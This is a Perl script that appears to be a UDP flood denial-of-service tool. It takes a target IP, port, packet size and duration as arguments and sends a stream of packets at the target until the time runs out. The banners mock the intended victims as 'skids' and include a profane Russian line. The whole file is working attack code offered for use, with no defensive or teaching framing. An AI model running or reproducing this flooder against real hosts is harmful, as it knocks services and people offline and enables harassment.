#!/usr/bin/perl

use Term::ANSIColor qw(:constants);
    $Term::ANSIColor::AUTORESET = 2;

print BOLD MAGENTA "          Coded by urError! [IG: urerror_vanish]\n";
print BOLD MAGENTA "         |--------------------|\n";
print BOLD PURPLE "          |クレイグ・ジョーンズ|\n";
print BOLD BLUE "            |--------------------|\n";
print BOLD BLUE "              трахни тебя, битриз.\n";

##
# urError <3 
##

use Socket;
use strict;

my ($ip,$port,$size,$time) = @ARGV;

my ($iaddr,$endtime,$psize,$pport);

$iaddr = inet_aton("$ip") or die "Cannot resolve hostname $ip\n";
$endtime = time() + ($time ? $time : 100);
socket(flood, PF_INET, SOCK_DGRAM, 17);

print BOLD MAGENTA<<EOTEXT;


███████╗██╗  ██╗██╗██████╗ ███╗   ██╗███████╗████████╗
██╔════╝██║ ██╔╝██║██╔══██╗████╗  ██║██╔════╝╚══██╔══╝
███████╗█████╔╝ ██║██║  ██║██╔██╗ ██║█████╗     ██║   
╚════██║██╔═██╗ ██║██║  ██║██║╚██╗██║██╔══╝     ██║   
███████║██║  ██╗██║██████╔╝██║ ╚████║███████╗   ██║   
╚══════╝╚═╝  ╚═╝╚═╝╚═════╝ ╚═╝  ╚═══╝╚══════╝   ╚═╝   
                                                      
                                                                                                                
	"Once A Skid.... Always A Skid." -Fuck Skidz 
EOTEXT





print "Slamming The Skidz ---> $ip " . ($port ? $port : "random") . " port with " . 
  ($size ? "$size-byte" : "random size") . " packets" . 
  ($time ? " for $time seconds" : "") . "\n";
print "Give The Skid A Second Chance If He Joins Back And Doesnt Say Sorry Slam Him Again / Give Him A Chance Just [Ctrl +C]\n" unless $time;
 
for (;time() <= $endtime;) {
  $psize = $size ? $size : int(rand(1024-64)+64) ;
  $pport = $port ? $port : int(rand(65500))+1;
 
  send(flood, pack("a$psize","flood"), 0, pack_sockaddr_in($pport, $iaddr));}